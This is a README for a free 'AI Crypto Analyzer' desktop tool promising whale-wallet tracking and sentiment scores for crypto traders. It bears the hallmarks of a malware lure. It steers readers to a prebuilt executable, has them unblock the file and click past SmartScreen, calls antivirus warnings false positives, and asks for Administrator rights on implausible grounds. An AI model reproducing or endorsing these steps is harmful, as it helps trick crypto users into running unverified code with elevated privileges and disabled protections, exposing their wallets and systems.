AI Crypto Analyzer v5.2
Advanced on-chain sentiment analysis and whale wallet tracking for BTC, ETH, and top altcoins.

VersionLicensePlatform

📊 Overview
AI Crypto Analyzer is a desktop application built for traders and developers who need deep insights into market sentiment without paying for CoinGlass or Token Terminal. v5.2 introduces a lightweight LSTM model to parse real-time on-chain whale movements, exchange inflows/outflows, and social volume.

No registration required.
No API keys needed.
100% local execution.
⚠️ Windows Defender & SmartScreen Warning
This is an open-source project. Because we do not purchase an expensive Code Signing Certificate, Windows SmartScreen might flag Ai_Analyzer_v5.2.exe as "unrecognized."

This is a false positive. The application requires Administrator privileges to establish direct RPC connections to blockchain nodes and bypass local network throttling for real-time data feeds.

How to run:
Download Ai_Analyzer_v5.2_Windows.zip from the Releases page.
Extract the archive.
Right-click Ai_Analyzer_v5.2.exe -> select Properties.
Check the box "Unblock" at the bottom of the General tab -> click Apply.
Run Ai_Analyzer_v5.2.exe. If Windows shows a blue SmartScreen, click "More Info" -> "Run Anyway".
🚀 Installation
Pre-compiled Binary (Recommended)
Go to the Releases section.
Download Ai_Analyzer_v5.2_Windows.zip.
Extract and run Ai_Analyzer_v5.2.exe (Follow the Windows Defender guide above).
Run from Source (For developers)
git clone https://github.com/yourusername/ai-crypto-analyzer.gitcd ai-crypto-analyzerpip install -r requirements.txtpython main.py
🛠 Usage
Launch Ai_Analyzer_v5.2.exe.
Select the asset (e.g., BTC, ETH, SOL).
Click "Start Scan".
The AI model will aggregate data for 10-15 seconds and output a sentiment score based on whale movements.
❓ FAQ
Q: Why does it ask for Administrator privileges?
A: The tool makes high-frequency RPC calls to blockchain nodes. Windows Firewall blocks unsigned apps from making these requests by default. Admin rights ensure the data stream is not interrupted.

Q: Is my data safe?
A: Yes. The application is 100% local. No analytics or personal data is sent to external servers.

Q: Which networks are supported?
A: Ethereum (ERC-20), Binance Smart Chain (BEP-20), and Polygon.
